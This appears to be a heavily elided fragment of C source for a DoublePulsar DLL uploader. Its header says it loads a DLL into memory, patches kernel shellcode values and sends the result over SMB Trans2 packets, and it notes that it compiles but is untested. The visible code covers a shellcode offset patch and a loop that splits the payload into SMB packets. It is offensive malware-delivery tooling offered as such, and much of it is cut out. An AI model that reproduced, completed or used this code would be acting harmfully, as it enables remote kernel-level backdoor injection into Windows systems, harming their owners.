...
This is the Doublepulsar DLL uploader program that reads the file into memory, 
editing the correct values of the shellcode and then builds the SMB packet using a structure

As of September 7 2023, this compiles but untested.  
*/
...
//SMB Trans2 session setup PING packet. 
...
int main(int argc, char* argv[])
{
	...
	//copy our returned userID value to the TreeConnect request packet
	...
	*/
	...
	//update UserID in modified SMB TreeConnect Request
	...
	*(DWORD*)&kernel_rundll_shellcode[2166 + 0xF86] = 1;
	...
	for (ctx = 0; ctx < payload_totalsize;)
	{
		...
		if (bytesLeft < 4096)
		{
			memset((unsigned char*)last_packet, 0x00, size_last_packet);
			...
			net_bios* nb = (net_bios*)last_packet;
			smb_header* smb = (smb_header*)(last_packet + sizeof(net_bios));
			SMB_TRANS2_EXEC_PACKET* trans2 = (SMB_TRANS2_EXEC_PACKET*)(last_packet + sizeof(net_bios) + sizeof(smb_header));
			smb_parameters* smb_params = (smb_parameters*)(last_packet + sizeof(net_bios) + sizeof(smb_header) + sizeof(SMB_TRANS2_EXEC_PACKET));
			//smb_parameters* smb_params = (smb_parameters*)(buffer + sizeof(net_bios) + sizeof(smb_header) + sizeof(SMB_TRANS2_EXEC_PACKET));
			//smb_data* SMBDATA = (smb_data*)(last_packet + sizeof(net_bios) + sizeof(smb_header) + sizeof(SMB_TRANS2_EXEC_PACKET) + sizeof(smb_parameters));
			unsigned char *SMBDATA = (unsigned char*)(last_packet + sizeof(net_bios) + sizeof(smb_header) + sizeof(SMB_TRANS2_EXEC_PACKET) + sizeof(smb_parameters));

			memcpy(SMBDATA, pFULLBUFFER + ctx, bytesLeft);
			...
			nb->length = htons(sizeof(net_bios) + sizeof(smb_header) + sizeof(SMB_TRANS2_EXEC_PACKET) + sizeof(smb_parameters) + bytesLeft - 4);
			...
			*/
			...
			trans2->byteCount = bytesLeft + 13; //make this dynamic -> calc based off sizeof(params)+sizeof(SMB_DATA)
			trans2->padding = 0x00;
		...
		net_bios* nb = (net_bios*)big_packet;
		smb_header* smb = (smb_header*)(big_packet + sizeof(net_bios));
		SMB_TRANS2_EXEC_PACKET* trans2 = (SMB_TRANS2_EXEC_PACKET*)(big_packet + sizeof(net_bios) + sizeof(smb_header));
		smb_parameters* smb_params = (smb_parameters*)(big_packet + sizeof(net_bios) + sizeof(smb_header) + sizeof(SMB_TRANS2_EXEC_PACKET));
		smb_data* SMBDATA = (smb_data*)(big_packet + sizeof(net_bios) + sizeof(smb_header) + sizeof(SMB_TRANS2_EXEC_PACKET) + sizeof(smb_parameters));
